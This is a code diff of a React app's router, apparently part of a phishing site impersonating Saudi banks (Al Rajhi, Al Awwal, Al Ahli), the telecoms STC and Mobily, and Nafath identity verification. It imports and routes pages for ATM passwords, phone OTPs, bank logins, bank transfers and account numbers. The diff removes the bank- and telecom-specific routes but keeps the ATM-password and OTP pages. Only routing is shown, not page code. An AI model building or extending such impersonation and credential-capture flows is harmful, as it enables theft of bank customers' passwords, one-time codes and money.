@@ -41,29 +41,10 @@ import ATMPassword from "./pages/ATMPassword";
 // Phone Verification Pages
 import PhoneVerification from "./pages/PhoneVerification";
 import PhoneOTP from "./pages/PhoneOTP";
-import STCCallAlert from "./pages/STCCallAlert";
-import MobilyCallAlert from "./pages/MobilyCallAlert";
-import MyStcOTP from "./pages/MyStcOTP";
-import STCPassword from "./pages/STCPassword";
 
-// Al Rajhi Bank Pages
-import AlRajhiLogin from "./pages/AlRajhiLogin";
-import AlRajhiOTP from "./pages/AlRajhiOTP";
-import AlRajhiNafath from "./pages/AlRajhiNafath";
-import AlRajhiAlert from "./pages/AlRajhiAlert";
-import AlRajhiCall from "./pages/AlRajhiCall";
-import RajhiPaymentError from "./pages/RajhiPaymentError";
 
-// Al Awwal Bank Pages
-import AlAwwalBank from "./pages/AlAwwalBank";
-import AlAwwalNafath from "./pages/AlAwwalNafath";
 
-// Al Ahli Bank Pages
-import AlAhliOTP from "./pages/AlAhliOTP";
 
-// Bank Transfer Pages
-import BankTransfer from "./pages/BankTransfer";
-import BankAccountNumber from "./pages/BankAccountNumber";
 
 // Final Page
 import FinalPage from "./pages/FinalPage";
@@ -104,29 +85,10 @@ function Router() {
       {/* Phone Verification Routes */}
       <Route path={"/phone-verification"} component={PhoneVerification} />
       <Route path={"/phone-otp"} component={PhoneOTP} />
-      <Route path={"/stc-call-alert"} component={STCCallAlert} />
-      <Route path={"/mobily-call-alert"} component={MobilyCallAlert} />
-      <Route path={"/mystc-otp"} component={MyStcOTP} />
-      <Route path={"/stc-password"} component={STCPassword} />
 
-      {/* Al Rajhi Bank Routes */}
-      <Route path={"/alrajhi-login"} component={AlRajhiLogin} />
-      <Route path={"/alrajhi-otp"} component={AlRajhiOTP} />
-      <Route path={"/alrajhi-nafath"} component={AlRajhiNafath} />
-      <Route path={"/alrajhi-alert"} component={AlRajhiAlert} />
-      <Route path={"/alrajhi-call"} component={AlRajhiCall} />
-      <Route path={"/rajhi-payment-error"} component={RajhiPaymentError} />
 
-      {/* Al Awwal Bank Routes */}
-      <Route path={"/alawwal-bank"} component={AlAwwalBank} />
-      <Route path={"/alawwal-nafath"} component={AlAwwalNafath} />
 
-      {/* Al Ahli Bank Routes */}
-      <Route path={"/alahli-otp"} component={AlAhliOTP} />
 
-      {/* Bank Transfer Routes */}
-      <Route path={"/bank-transfer"} component={BankTransfer} />
-      <Route path={"/bank-account-number"} component={BankAccountNumber} />
 
       {/* Final Page */}
       <Route path={"/final-page"} component={FinalPage} />
